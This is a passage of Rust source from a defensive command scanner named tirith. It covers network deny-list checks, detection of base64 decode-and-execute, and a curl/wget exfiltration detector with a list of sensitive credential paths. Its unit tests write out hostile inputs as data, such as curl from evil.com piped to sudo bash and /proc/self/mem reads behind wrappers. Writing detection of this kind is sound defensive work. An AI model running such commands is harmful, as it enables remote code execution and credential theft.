    if host_port.starts_with('[') {
        if let Some(bracket_end) = host_port.find(']') {
            return host_port[1..bracket_end].to_string();
        }
    }
    // Unbracketed string with multiple colons is bare IPv6 — port stripping would corrupt it.
    let colon_count = host_port.chars().filter(|&c| c == ':').count();
    if colon_count > 1 {
        return host_port.to_string();
    }
    if let Some(colon_idx) = host_port.rfind(':') {
        if host_port[colon_idx + 1..].parse::<u16>().is_ok() {
            return host_port[..colon_idx].to_string();
        }
    }
    host_port.to_string()
}

/// Check if an IPv4 address is in a private/reserved range (excluding loopback).
fn is_private_ip(host: &str) -> bool {
    if let Ok(ip) = host.parse::<std::net::Ipv4Addr>() {
        let octets = ip.octets();
        // Loopback (127.x) is excluded — local traffic has no SSRF/lateral movement risk.
        if octets[0] == 127 {
            return false;
        }
        return octets[0] == 10
            || (octets[0] == 172 && (16..=31).contains(&octets[1]))
            || (octets[0] == 192 && octets[1] == 168);
    }
    false
}

/// POSIX fetch commands — appropriate for both `tirith run` and `vet` hints.
const POSIX_FETCH_COMMANDS: &[&str] = &["curl", "wget", "http", "https", "xh", "fetch"];

/// PowerShell fetch commands — appropriate for `vet` hints only
/// (`tirith run` doesn't support PowerShell interpreter flows).
const POWERSHELL_FETCH_COMMANDS: &[&str] =
    &["iwr", "irm", "invoke-webrequest", "invoke-restmethod"];

/// Source commands that are not URL-fetching (no vet/tirith-run hints).
const NON_FETCH_SOURCE_COMMANDS: &[&str] = &["scp", "rsync"];

fn is_source_command(cmd: &str) -> bool {
    POSIX_FETCH_COMMANDS.contains(&cmd)
        || POWERSHELL_FETCH_COMMANDS.contains(&cmd)
        || NON_FETCH_SOURCE_COMMANDS.contains(&cmd)
}

/// All URL-fetching commands (union of POSIX + PowerShell).
fn is_url_fetch_command(cmd: &str) -> bool {
    POSIX_FETCH_COMMANDS.contains(&cmd) || POWERSHELL_FETCH_COMMANDS.contains(&cmd)
}

/// Whether this fetch source supports `tirith run` hints.
/// True only for POSIX fetch commands (`tirith run` is a shell-script runner).
fn supports_tirith_run_hint(cmd: &str) -> bool {
    POSIX_FETCH_COMMANDS.contains(&cmd)
}

/// Check if string starts with http:// or https:// (case-insensitive scheme).
fn starts_with_http_scheme(s: &str) -> bool {
    let b = s.as_bytes();
    (b.len() >= 8 && b[..8].eq_ignore_ascii_case(b"https://"))
        || (b.len() >= 7 && b[..7].eq_ignore_ascii_case(b"http://"))
}

/// Strip control characters (0x00–0x1F, 0x7F) from a URL so it cannot inject
/// ANSI escapes, newlines, or other terminal-interpreted sequences into the
/// finding description displayed to the user.
fn sanitize_url_for_display(url: &str) -> String {
    url.chars().filter(|&c| !c.is_ascii_control()).collect()
}

/// Extract all URLs from command arguments.
fn extract_urls_from_args(args: &[String], shell: ShellType) -> Vec<String> {
    let mut urls = Vec::new();
    for arg in args {
        let normalized = normalize_shell_token(arg.trim(), shell);

        if starts_with_http_scheme(&normalized) {
            urls.push(normalized);
            continue;
        }

        // Check --flag=<url> forms (e.g., --url=https://...)
        if let Some((_, val)) = normalized.split_once('=') {
            if starts_with_http_scheme(val) {
                urls.push(val.to_string());
            }
        }
    }
    urls
}

/// Check command destination hosts against policy network deny/allow lists.
///
/// For each source command (curl, wget, etc.), extracts the destination host and
/// checks against deny/allow lists. Allow takes precedence (exempts from deny).
pub fn check_network_policy(
    input: &str,
    shell: ShellType,
    deny: &[String],
    allow: &[String],
) -> Vec<Finding> {
    if deny.is_empty() {
        return Vec::new();
    }

    let segments = tokenize::tokenize(input, shell);
    let mut findings = Vec::new();

    for segment in &segments {
        // Resolve through wrappers (`sudo`, `env`, `command`, `time`, ...) so e.g.
        // `sudo curl http://evil.com` is treated like the bare source command. Reading
        // `segment.command` directly lets any wrapper bypass the deny list.
        let Some((resolved_name, resolved_args)) = crate::extract::resolve_wrapped_command(segment)
        else {
            continue;
        };
        let cmd_base = resolved_name.to_lowercase();
        if !is_source_command(&cmd_base) {
            continue;
        }

        let is_scp_family = matches!(cmd_base.as_str(), "scp" | "rsync");
        for arg in &resolved_args {
            let trimmed = arg.trim().trim_matches(|c: char| c == '\'' || c == '"');
            if trimmed.starts_with('-') {
                // `--url=http://evil.com` style — URL is wedged into the flag value.
                if let Some((_flag, value)) = trimmed.split_once('=') {
                    if let Some(host) = extract_host_from_arg(value) {
                        if matches_network_list(&host, allow) {
                            continue;
                        }
                        if matches_network_list(&host, deny) {
                            findings.push(Finding {
                                rule_id: RuleId::CommandNetworkDeny,
                                severity: Severity::Critical,
                                title: format!("Network destination denied by policy: {host}"),
                                description: format!(
                                    "Command accesses {host}, which is on the network deny list"
                                ),
                                evidence: vec![Evidence::Url {
                                    raw: value.to_string(),
                                }],
                                human_view: None,
                                agent_view: None,
                                mitre_id: None,
                                custom_rule_id: None,
                            });
                            continue;
                        }
                    }
                }
                continue;
            }

            // scp/rsync remote specs ([user@]host:path) aren't URLs and don't match
            // `extract_host_from_arg`, so they need their own path or the deny list
            // silently passes them through.
            if is_scp_family {
                if let Some(spec) = crate::extract::parse_scp_remote_spec(trimmed, shell) {
                    let host = spec.host;
                    if matches_network_list(&host, allow) {
                        continue;
                    }
                    if matches_network_list(&host, deny) {
                        findings.push(Finding {
                            rule_id: RuleId::CommandNetworkDeny,
                            severity: Severity::Critical,
                            title: format!("Network destination denied by policy: {host}"),
                            description: format!(
                                "scp/rsync accesses {host}, which is on the network deny list"
                            ),
                            evidence: vec![Evidence::Url {
                                raw: trimmed.to_string(),
                            }],
                            human_view: None,
                            agent_view: None,
                            mitre_id: None,
                            custom_rule_id: None,
                        });
                        return findings;
                    }
                    continue;
                }
            }

            if let Some(host) = extract_host_from_arg(trimmed) {
                if matches_network_list(&host, allow) {
                    continue;
                }
                if matches_network_list(&host, deny) {
                    findings.push(Finding {
                        rule_id: RuleId::CommandNetworkDeny,
                        severity: Severity::Critical,
                        title: format!("Network destination denied by policy: {host}"),
                        description: format!(
                            "Command accesses {host}, which is on the network deny list"
                        ),
                        evidence: vec![Evidence::Url {
                            raw: trimmed.to_string(),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                    return findings;
                }
            }
        }
    }

    findings
}

/// Check if a host matches any entry in a network list.
///
/// Supports exact hostname match, suffix match (`.example.com` matches
/// `sub.example.com`), and CIDR match for IPv4 addresses.
fn matches_network_list(host: &str, list: &[String]) -> bool {
    for entry in list {
        // CIDR match: "10.0.0.0/8"
        if entry.contains('/') {
            if let Some(matched) = cidr_contains(host, entry) {
                if matched {
                    return true;
                }
                continue;
            }
        }

        // Exact match
        if host.eq_ignore_ascii_case(entry) {
            return true;
        }

        // Suffix match: entry "example.com" matches "sub.example.com"
        if host.len() > entry.len()
            && host.ends_with(entry.as_str())
            && host.as_bytes()[host.len() - entry.len() - 1] == b'.'
        {
            return true;
        }
    }
    false
}

/// Check if an IPv4 address is within a CIDR range.
/// Returns `Some(true/false)` if both parse, `None` if either fails.
fn cidr_contains(host: &str, cidr: &str) -> Option<bool> {
    let parts: Vec<&str> = cidr.splitn(2, '/').collect();
    if parts.len() != 2 {
        return None;
    }
    let network: std::net::Ipv4Addr = parts[0].parse().ok()?;
    let prefix_len: u32 = parts[1].parse().ok()?;
    if prefix_len > 32 {
        return None;
    }
    let host_ip: std::net::Ipv4Addr = host.parse().ok()?;

    let mask = if prefix_len == 0 {
        0u32
    } else {
        !0u32 << (32 - prefix_len)
    };
    let net_bits = u32::from(network) & mask;
    let host_bits = u32::from(host_ip) & mask;

    Some(net_bits == host_bits)
}

fn check_base64_decode_execute(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    // Pattern A: `base64 -d | bash` — base64 leads the chain.
    for (i, seg) in segments.iter().enumerate() {
        if let Some(ref cmd) = seg.command {
            let cmd_base = normalize_cmd_base(cmd, shell);
            if cmd_base == "base64" {
                let has_decode_flag = seg.args.iter().any(|arg| {
                    let norm = normalize_shell_token(arg, shell);
                    matches!(norm.as_str(), "-d" | "--decode" | "-D")
                });
                if has_decode_flag {
                    if let Some(next_seg) = segments.get(i + 1) {
                        if let Some(ref sep) = next_seg.preceding_separator {
                            if (sep == "|" || sep == "|&")
                                && resolve_interpreter_name(next_seg, shell).is_some()
                            {
                                findings.push(Finding {
                                    rule_id: RuleId::Base64DecodeExecute,
                                    severity: Severity::High,
                                    title: "Base64 decode piped to interpreter".to_string(),
                                    description: "Command decodes base64 content and pipes it directly to an interpreter for execution".to_string(),
                                    evidence: vec![Evidence::CommandPattern {
                                        pattern: "base64 decode | interpreter".to_string(),
                                        matched: redact::redact_shell_assignments(&format!(
                                            "{} | {}", seg.raw, next_seg.raw
                                        )),
                                    }],
                                    human_view: None,
                                    agent_view: None,
                                    mitre_id: None,
                                    custom_rule_id: None,
                                });
                            }
                        }
                    }
                }
            }
        }

        // Pattern A': `echo X | base64 -d | bash` — base64 is mid-chain.
        if i >= 1 {
            if let Some(ref sep) = seg.preceding_separator {
                if sep == "|" || sep == "|&" {
                    if let Some(ref cmd) = seg.command {
                        let cmd_base = normalize_cmd_base(cmd, shell);
                        if cmd_base == "base64" {
                            let has_decode = seg.args.iter().any(|arg| {
                                let norm = normalize_shell_token(arg, shell);
                                matches!(norm.as_str(), "-d" | "--decode" | "-D")
                            });
                            if has_decode {
                                if let Some(next_seg) = segments.get(i + 1) {
                                    if let Some(ref next_sep) = next_seg.preceding_separator {
                                        if (next_sep == "|" || next_sep == "|&")
                                            && resolve_interpreter_name(next_seg, shell).is_some()
                                        {
                                            // Pattern A and A' both observe the same chain; only fire once per input.
                                            let already_found = findings
                                                .iter()
                                                .any(|f| f.rule_id == RuleId::Base64DecodeExecute);
                                            if !already_found {
                                                findings.push(Finding {
                                                    rule_id: RuleId::Base64DecodeExecute,
                                                    severity: Severity::High,
                                                    title: "Base64 decode piped to interpreter".to_string(),
                                                    description: "Command decodes base64 content and pipes it directly to an interpreter for execution".to_string(),
                                                    evidence: vec![Evidence::CommandPattern {
                                                        pattern: "base64 decode | interpreter".to_string(),
                                                        matched: redact::redact_shell_assignments(&format!(
                                                            "{} | {}", seg.raw, next_seg.raw
                                                        )),
                                                    }],
                                                    human_view: None,
                                                    agent_view: None,
                                                    mitre_id: None,
                                                    custom_rule_id: None,
                                                });
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Pattern B: inline decode-execute — e.g. `python -c '...b64decode...'`.
    // Wrapped forms (sudo, env, command, nohup) resolve through resolve_interpreter_name.
    for seg in segments {
        let interpreter = if let Some(ref cmd) = seg.command {
            let cmd_base = normalize_cmd_base(cmd, shell);
            if is_interpreter(&cmd_base) {
                Some(cmd_base)
            } else {
                resolve_interpreter_name(seg, shell)
            }
        } else {
            None
        };

        if let Some(interp) = interpreter {
            let has_exec_flag = seg.args.iter().any(|arg| {
                let norm = normalize_shell_token(arg, shell);
                norm == "-c" || norm == "-e"
            });
            if has_exec_flag {
                let args_joined = seg.args.join(" ");
                let lower = args_joined.to_lowercase();
                let has_decode_exec = (lower.contains("b64decode") && lower.contains("exec"))
                    || (lower.contains("atob") && lower.contains("eval"))
                    || (lower.contains("buffer.from") && lower.contains("eval"));
                if has_decode_exec {
                    findings.push(Finding {
                        rule_id: RuleId::Base64DecodeExecute,
                        severity: Severity::High,
                        title: "Inline base64 decode-execute".to_string(),
                        description: format!(
                            "Interpreter '{interp}' executes code with base64 decode and eval/exec co-occurrence"
                        ),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "interpreter -c/e with decode+execute".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                }
            }
        }
    }

    // Pattern C: `powershell -EncodedCommand <base64>` (and `-enc`/`-ec` aliases).
    for seg in segments {
        if let Some(ref cmd) = seg.command {
            let cmd_base = normalize_cmd_base(cmd, shell);
            if cmd_base == "powershell" || cmd_base == "pwsh" {
                let has_enc_flag = seg.args.iter().any(|arg| {
                    let norm = normalize_shell_token(arg, shell);
                    let lower = norm.to_lowercase();
                    lower == "-encodedcommand" || lower == "-enc" || lower == "-ec"
                });
                if has_enc_flag {
                    findings.push(Finding {
                        rule_id: RuleId::Base64DecodeExecute,
                        severity: Severity::High,
                        title: "PowerShell encoded command".to_string(),
                        description: format!(
                            "PowerShell ({cmd_base}) invoked with -EncodedCommand, executing base64-encoded script"
                        ),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "powershell -EncodedCommand".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                }
            }
        }
    }
}

/// Sensitive file paths for data exfiltration detection.
const SENSITIVE_PATHS: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    "~/.ssh/id_rsa",
    "~/.ssh/id_ed25519",
    "~/.ssh/id_ecdsa",
    "~/.ssh/id_dsa",
    "~/.aws/credentials",
    "~/.kube/config",
    "~/.docker/config.json",
    "~/.gnupg/",
    "~/.netrc",
    "~/.git-credentials",
];

fn is_sensitive_file_ref(value: &str) -> bool {
    let v = value.trim_start_matches('@');
    SENSITIVE_PATHS.iter().any(|p| v.contains(p))
}

fn has_sensitive_env_ref(value: &str) -> bool {
    use crate::rules::shared::SENSITIVE_KEY_VARS;
    for var in SENSITIVE_KEY_VARS {
        if value.contains(&format!("${var}")) || value.contains(&format!("${{{var}}}")) {
            return true;
        }
    }
    false
}

fn has_sensitive_cmd_substitution(value: &str) -> bool {
    // `$(...)` only — backtick substitution is ambiguous in PowerShell where ` is the escape char.
    if let Some(start) = value.find("$(") {
        let rest = &value[start..];
        return SENSITIVE_PATHS.iter().any(|p| rest.contains(p));
    }
    false
}

fn check_data_exfiltration(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some(ref cmd) = seg.command else {
            continue;
        };
        let cmd_base = normalize_cmd_base(cmd, shell);

        match cmd_base.as_str() {
            "curl" => check_curl_exfiltration(seg, shell, findings),
            "wget" => check_wget_exfiltration(seg, shell, findings),
            _ => {}
        }
    }
}

fn check_curl_exfiltration(seg: &tokenize::Segment, shell: ShellType, findings: &mut Vec<Finding>) {
    let args = &seg.args;
    let mut i = 0;
    while i < args.len() {
        let norm = normalize_shell_token(&args[i], shell);

        // curl accepts short flags glued (`-d@file`) as well as `-d file`, hence the length-2 check.
        let is_data_flag =
            norm == "-d" || norm.starts_with("--data") || norm.starts_with("-d") && norm.len() > 2;
        let is_form_flag =
            norm == "-F" || norm.starts_with("--form") || norm.starts_with("-F") && norm.len() > 2;
        let is_upload_flag = norm == "-T" || norm.starts_with("--upload-file");

        if is_data_flag || is_form_flag || is_upload_flag {
            let value = if let Some(eq_pos) = norm.find('=') {
                Some(norm[eq_pos + 1..].to_string())
            } else if (norm == "-d"
                || norm == "-F"
                || norm == "-T"
                || norm == "--data"
                || norm == "--data-binary"
                || norm == "--data-raw"
                || norm == "--data-urlencode"
                || norm == "--form"
                || norm == "--upload-file")
                && i + 1 < args.len()
            {
                i += 1;
                Some(normalize_shell_token(&args[i], shell))
            } else if (norm.starts_with("-d") || norm.starts_with("-F")) && norm.len() > 2 {
                // Glued short-flag form: -dVAL or -FVAL.
                Some(norm[2..].to_string())
            } else {
                None
            };

            if let Some(val) = value {
                let is_sensitive = if is_upload_flag {
                    // curl's `-T` takes a raw path (no `@` prefix, unlike `-d`/`-F`).
                    SENSITIVE_PATHS.iter().any(|p| val.contains(p))
                } else {
                    is_sensitive_file_ref(&val)
                        || has_sensitive_env_ref(&val)
                        || has_sensitive_cmd_substitution(&val)
                };

                if is_sensitive {
                    findings.push(Finding {
                        rule_id: RuleId::DataExfiltration,
                        severity: Severity::High,
                        title: "Data exfiltration via curl upload".to_string(),
                        description: "curl command uploads sensitive data (credentials, keys, or private files) to a remote server".to_string(),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "curl upload sensitive data".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                    return;
                }
            }
        }
        i += 1;
    }
}

fn check_wget_exfiltration(seg: &tokenize::Segment, shell: ShellType, findings: &mut Vec<Finding>) {
    let args = &seg.args;
    let mut i = 0;
    while i < args.len() {
        let norm = normalize_shell_token(&args[i], shell);

        let is_post_data = norm.starts_with("--post-data");
        let is_post_file = norm.starts_with("--post-file");

        if is_post_data || is_post_file {
            let value = if let Some(eq_pos) = norm.find('=') {
                Some(norm[eq_pos + 1..].to_string())
            } else if i + 1 < args.len() {
                i += 1;
                Some(normalize_shell_token(&args[i], shell))
            } else {
                None
            };

            if let Some(val) = value {
                let is_sensitive = if is_post_file {
                    SENSITIVE_PATHS.iter().any(|p| val.contains(p))
                } else {
                    is_sensitive_file_ref(&val)
                        || has_sensitive_env_ref(&val)
                        || has_sensitive_cmd_substitution(&val)
                };

                if is_sensitive {
                    findings.push(Finding {
                        rule_id: RuleId::DataExfiltration,
                        severity: Severity::High,
                        title: "Data exfiltration via wget upload".to_string(),
                        description: "wget command uploads sensitive data (credentials, keys, or private files) to a remote server".to_string(),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "wget upload sensitive data".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                    return;
                }
            }
        }
        i += 1;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Helper: run `check()` with no cwd and Exec context (the common case for tests).
    fn check_default(input: &str, shell: ShellType) -> Vec<Finding> {
        check(input, shell, None, ScanContext::Exec)
    }

    #[test]
    fn test_pipe_sudo_flags_detected() {
        let findings = check_default(
            "curl https://evil.com | sudo -u root bash",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo -u root bash"
        );
    }

    #[test]
    fn test_pipe_sudo_long_flag_detected() {
        let findings = check_default(
            "curl https://evil.com | sudo --user=root bash",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo --user=root bash"
        );
    }

    #[test]
    fn test_pipe_env_var_assignment_detected() {
        let findings = check_default("curl https://evil.com | env VAR=1 bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env VAR=1 bash"
        );
    }

    #[test]
    fn test_pipe_env_u_flag_detected() {
        let findings = check_default("curl https://evil.com | env -u HOME bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env -u HOME bash"
        );
    }

    #[test]
    fn test_facts_uses_sudo_through_wrappers() {
        // CodeRabbit M13 finding R6: `command.uses_sudo` must be TRUE whenever
        // `sudo` appears as a leader anywhere in the wrapper chain — including
        // when it sits BETWEEN a wrapper and the real command, where the old
        // "final base == sudo" check missed it.
        let sudo_cases = [
            "sudo bash -c 'echo hi'",     // bare sudo leader
            "env sudo bash -c 'echo hi'", // env wraps sudo
            "command sudo apt install x", // command wraps sudo
            "env -S \"sudo bash -c id\"", // env -S string carries sudo
            "nohup sudo bash script.sh",  // nohup wraps sudo
            "env command sudo bash",      // nested wrappers around sudo
            "sudo -u root bash",          // sudo with a value flag
        ];
        for input in sudo_cases {
            let facts = extract_command_facts(input, ShellType::Posix);
            assert!(
                facts.uses_sudo,
                "uses_sudo must be true for wrapped sudo: {input:?}"
            );
        }

        // R6 round 3: a `--` separator must not stop the chain walk at the
        // immediate next token — the post-`--` tail is recursed through the
        // same wrapper logic, so `sudo` nested behind a wrapper after `--` is
        // still detected.
        let sudo_after_dashdash_cases = [
            "command -- env sudo bash",   // command -- (env wraps sudo)
            "env -- command sudo bash",   // env -- (command wraps sudo)
            "command -- sudo bash",       // command -- sudo (immediate)
            "env -- sudo bash",           // env -- sudo (immediate)
            "exec -- nohup sudo bash",    // exec -- (nohup wraps sudo)
            "env -- env -- command sudo", // chained `--` separators
        ];
        for input in sudo_after_dashdash_cases {
            let facts = extract_command_facts(input, ShellType::Posix);
            assert!(
                facts.uses_sudo,
                "uses_sudo must be true for sudo nested after `--`: {input:?}"
            );
        }

        let non_sudo_cases = [
            "bash -c 'echo hi'",     // plain interpreter, no sudo
            "env bash -c 'echo hi'", // env wraps bash (no sudo)
            "command apt install x", // command wraps apt (no sudo)
            "doas bash",             // doas is not sudo
            "command -- bash",       // command -- bash (no sudo after `--`)
            "env -- bash -c id",     // env -- bash (no sudo after `--`)
            "command -- env bash",   // command -- env bash (no sudo, nested)
        ];
        for input in non_sudo_cases {
            let facts = extract_command_facts(input, ShellType::Posix);
            assert!(
                !facts.uses_sudo,
                "uses_sudo must be false without sudo: {input:?}"
            );
        }
    }

    #[test]
    fn test_facts_uses_sudo_deep_wrapper_chain_does_not_overflow() {
        // CodeRabbit M13 round-13 finding R13-1: the wrapped-`sudo` detection
        // helpers (`segment_chain_contains_sudo` & friends) recurse through
        // env/command/exec/nohup wrappers and `env -S` payloads. tirith scans
        // untrusted command strings, so an absurdly-deep wrapper chain must NOT
        // recurse without bound and overflow the stack — `MAX_WRAPPER_DEPTH`
        // (32) caps the walk. These inputs are FAR deeper than that bound; the
        // assertion is simply that the `uses_sudo` computation COMPLETES without
        // crashing. The value is unspecified — `false` at budget exhaustion is
        // the safe/conservative answer and is acceptable here.

        // (1) Deeply nested env wrappers ending in `sudo bash`:
        // `env env env … sudo bash`. 5000 levels is orders of magnitude past
        // MAX_WRAPPER_DEPTH (32), so the helper gives up after ~32 recursive
        // descents rather than recursing 5000 frames deep.
        let deep_env = "env ".repeat(5000) + "sudo bash";
        let facts = extract_command_facts(&deep_env, ShellType::Posix);
        // Past the depth budget the walk bails early, so `sudo` is not reached —
        // but crucially the call RETURNED instead of overflowing the stack.
        assert!(
            !facts.uses_sudo,
            "absurdly-nested `env … sudo` should exhaust the budget (false), not crash"
        );

        // (2) Deeply nested `env -S "env -S \"…\""` payload: each layer
        // re-tokenizes its split-string body and recurses via
        // `command_string_chain_contains_sudo`. Build a single, linearly-sized
        // token whose body is `env -S env -S … sudo bash` (single-quoted whole
        // so the parser keeps re-entering the split-string walk). The depth
        // bound only ever re-tokenizes the first ~32 layers; the rest is inert
        // payload, so 500 layers proves the bound without exponential blowup.
        let inner = "env -S ".repeat(500) + "sudo bash";
        let nested_split = format!("env -S '{inner}'");
        let facts = extract_command_facts(&nested_split, ShellType::Posix);
        // Value unspecified at exhaustion; the point is the call returned.
        let _ = facts.uses_sudo;

        // The bound must NOT change realistic, shallow wrapped-sudo behavior:
        // these stay detected (well within MAX_WRAPPER_DEPTH).
        for input in [
            "sudo bash",
            "env sudo bash",
            "command sudo apt",
            r#"env -S "sudo bash -c id""#,
            "command -- env sudo bash",
            "env -- command sudo bash",
        ] {
            assert!(
                extract_command_facts(input, ShellType::Posix).uses_sudo,
                "realistic wrapped-sudo must stay detected under the depth bound: {input:?}"
            );
        }
        // And plain non-sudo stays false.
        for input in ["bash", "env bash", "command apt"] {
            assert!(
                !extract_command_facts(input, ShellType::Posix).uses_sudo,
                "non-sudo must stay false under the depth bound: {input:?}"
            );
        }
    }

    #[test]
    fn test_base_resolvers_deep_wrapper_chain_does_not_overflow() {
        // CodeRabbit M13 round-20 F1: the round-13 `MAX_WRAPPER_DEPTH` cap was only
        // enforced in `segment_chain_contains_sudo`. The SIBLING base resolvers
        // (`resolve_base_through_wrappers` → `resolve_base_sudo`/`resolve_base_env`/
        // `resolve_base_wrapper`/`resolve_base_from_command_string`) still recursed
        // unboundedly, so a deeply-nested wrapper chain blew the stack during
        // analysis. The budget is now threaded through all of them; at 0 they stop
        // unwrapping and return the conservative current-leader base / None. These
        // inputs are FAR past MAX_WRAPPER_DEPTH (32); the assertion is that
        // resolution COMPLETES without crashing.

        // (1) Deeply nested `command`/`env`/`sudo` wrappers around a /proc/*/mem
        // read drive `resolve_base_through_wrappers` directly via
        // `check_proc_mem_access`. 5000 levels is orders of magnitude past the
        // bound, so the resolver gives up rather than recursing 5000 frames deep.
        let deep_wrap = "command ".repeat(5000) + "cat /proc/self/mem";
        let _ = check_default(&deep_wrap, ShellType::Posix);

        // (2) Deeply nested `env -S "env -S \"…\""` base-resolution path:
        // `resolve_base_env` → `resolve_base_from_command_string` →
        // `resolve_base_through_wrappers_depth` mutually recurse, re-tokenizing each
        // split-string layer. A single linearly-sized token (single-quoted whole)
        // keeps the parser re-entering the split-string walk; the depth bound only
        // re-tokenizes the first ~32 layers.
        let inner = "env -S ".repeat(500) + "cat /proc/self/mem";
        let nested_split = format!("env -S '{inner}'");
        let _ = check_default(&nested_split, ShellType::Posix);
        // Also exercise it through the base resolver entry point directly.
        let segs = tokenize::tokenize(&nested_split, ShellType::Posix);
        let _ = resolve_base_through_wrappers(&segs[0], ShellType::Posix);

        // The bound must NOT change realistic, shallow base-resolution: a
        // /proc/*/mem read behind a couple of wrappers is still detected.
        // (`command sudo cat …` exercises the recursive wrapper→sudo base path
        // that F1 threads the budget through; `env -S "sudo cat …"` exercises the
        // split-string → command-string → base-resolver recursion.)
        for input in [
            "cat /proc/self/mem",
            "sudo cat /proc/self/mem",
            "env cat /proc/self/mem",
            "command sudo cat /proc/self/mem",
            r#"env -S "sudo cat /proc/self/mem""#,
        ] {
            let findings = check_default(input, ShellType::Posix);
            assert!(
                findings.iter().any(|f| f.rule_id == RuleId::ProcMemAccess),
                "shallow wrapped /proc/*/mem read must stay detected under the depth bound: {input:?}"
            );
        }
    }

    #[test]
    fn test_base_resolvers_peel_through_dashdash_terminator() {
        // CodeRabbit M13 round-21 F1: the end-of-options `--` token used to stop
        // wrapper unwrapping — the base resolvers returned the IMMEDIATELY-following
        // token verbatim. But that token is itself the command to run and may be
        // ANOTHER wrapper, so a chain hidden behind `--` evaded resolution
        // (`command -- sudo cat /proc/PID/mem` resolved to `sudo`, not `cat`). The
        // `--` branch now resolves the post-`--` remainder through the SAME
        // wrapper-peel recursion (sharing the `MAX_WRAPPER_DEPTH` budget).

        // (1) /proc/*/mem privesc hidden behind `command -- sudo`: must still be
        // detected. Before the fix the base resolved to `sudo` (not in
        // PROC_MEM_READER_CMDS), so ProcMemAccess never fired.
        for input in [
            "command -- sudo cat /proc/1/mem", // command -- sudo cat …
            "command -- env cat /proc/1/mem",  // command -- env cat …
            "sudo -- env cat /proc/1/mem",     // sudo -- env cat … (env after --)
            "env -- sudo cat /proc/1/mem",     // env -- sudo cat … (sudo after --)
            "command -- command -- sudo cat /proc/1/mem", // doubled `--`
        ] {
            let findings = check_default(input, ShellType::Posix);
            assert!(
                findings.iter().any(|f| f.rule_id == RuleId::ProcMemAccess),
                "proc-mem read with a wrapper chain behind `--` must be detected: {input:?}"
            );
        }
        // Direct base-resolver coverage: the post-`--` wrapper chain peels to `cat`.
        for input in [
            "command -- sudo cat /proc/1/mem",
            "command -- command -- sudo cat /proc/1/mem",
        ] {
            let segs = tokenize::tokenize(input, ShellType::Posix);
            assert_eq!(
                resolve_base_through_wrappers(&segs[0], ShellType::Posix),
                "cat",
                "wrapper chain behind `--` must resolve to the real base: {input:?}"
            );
        }

        // (2) A pipeline RHS `command -- env -S "bash -c id"` must resolve its
        // interpreter to `bash` and fire CurlPipeShell/PipeToInterpreter — the
        // post-`--` token is `env -S "…"`, another wrapper.
        let pipe = r#"curl https://x | command -- env -S "bash -c id""#;
        let findings = check_default(pipe, ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "interpreter behind `command -- env -S` must reach the pipe rule: {pipe:?}"
        );
        assert!(
            extract_command_facts(pipe, ShellType::Posix)
                .pipeline_targets
                .iter()
                .any(|t| t == "bash"),
            "pipeline target behind `command -- env -S` must resolve to bash"
        );

        // (3) BUDGET GUARD: a `command -- command -- … sudo …` chain nested FAR
        // past MAX_WRAPPER_DEPTH must terminate (the post-`--` recursion shares the
        // bounded budget, no new unbounded recursion). The point is the call
        // RETURNS without overflowing; the value at exhaustion is unspecified.
        let deep = "command -- ".repeat(5000) + "sudo cat /proc/self/mem";
        let _ = check_default(&deep, ShellType::Posix);
        let segs = tokenize::tokenize(&deep, ShellType::Posix);
        let _ = resolve_base_through_wrappers(&segs[0], ShellType::Posix);
    }

    #[test]
    fn test_facts_uses_sudo_env_split_string_payload_uses_wrapper_parser() {
        // CodeRabbit M13 round-15 R15-3: the `env -S "…"` payload is now run back
        // through the SAME wrapper-chain resolution as the rest of the file (each
        // tokenized segment via `segment_chain_contains_sudo`), not unwrapped to a
        // single `.first()` leader. That `.first()`-only path missed split-string
        // forms whose leader is an env-assignment prefix or a nested wrapper.
        let split_string_sudo_cases = [
            // env-assignment prefix INSIDE the split string: the tokenizer strips
            // the leading `FOO=1`, so the real leader is `sudo`. `.first()` saw the
            // assignment segment and missed it.
            r#"env -S "FOO=1 sudo bash""#,
            // nested `env -S` inside the payload: the inner split string re-enters
            // the same walk and reaches the wrapped `sudo`.
            r#"env -S "env -S 'sudo bash -c id'""#,
            // multiple env-assignments before sudo.
            r#"env -S "FOO=1 BAR=2 sudo apt install x""#,
            // --split-string= form carrying an assignment-prefixed payload.
            r#"env --split-string="FOO=1 sudo bash""#,
        ];
        for input in split_string_sudo_cases {
            let facts = extract_command_facts(input, ShellType::Posix);
            assert!(
